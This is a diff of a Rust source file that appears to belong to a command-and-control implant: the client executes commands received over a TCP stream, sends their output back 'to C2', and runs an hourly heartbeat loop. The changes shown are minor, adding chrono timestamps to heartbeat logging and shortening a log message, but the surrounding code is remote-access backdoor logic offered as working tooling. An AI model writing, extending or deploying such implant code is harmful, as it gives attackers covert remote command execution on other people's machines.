@@ -2,6 +2,9 @@ use std::io::{self, BufRead, BufReader, Write};
 use std::net::TcpStream;
 use std::process::Command;
 use crate::config::{Config, C2Command};
+extern crate chrono;
+
+use chrono::Local;
 
 /// Executes a given command on the client system.
 ///
@@ -93,7 +96,7 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
                                 };
                                 let response_json = serde_json::to_string(&response)
                                     .expect("Failed to serialize command response") + "\n";
-                                println!("[I] Command {} output sent to C2", command.name);
+                                println!("[I] {} output sent to C2", command.name);
                                 stream.write_all(response_json.as_bytes())?;
                                 stream.flush()?;
                             },
@@ -119,15 +122,17 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
 
 /// Sends a heartbeat message to the server in a loop.
 ///
-/// Every  hour (3600 seconds), it sends a predefined heartbeat message to the server to indicate
-/// that the client is still connected and operational. If sending the heartbeat fails, the loop breaks.
+/// Every  hour (3600 seconds), it sends a predefined heartbeat message to the
+/// server to indicate that the client is still connected and operational. If
+/// sending the heartbeat fails, the loop breaks.
 ///
 /// # Parameters
 ///
 /// * `stream`: A mutable reference to a TCPStream connected to the server.
 pub fn send_heartbeat_loop(stream: &mut TcpStream) {
     loop {
-        println!("[I] Sent heartbeat");
+        let date = Local::now();
+        println!("[I] Sent heartbeat at {}", date.format("[%Y-%m-%d][%H:%M:%S]"));
         let heartbeat_message = "heartbeat\n"; // Define your heartbeat message
         if let Err(e) = stream.write_all(heartbeat_message.as_bytes()) {
             println!("[E] Failed to send heartbeat: {}", e);
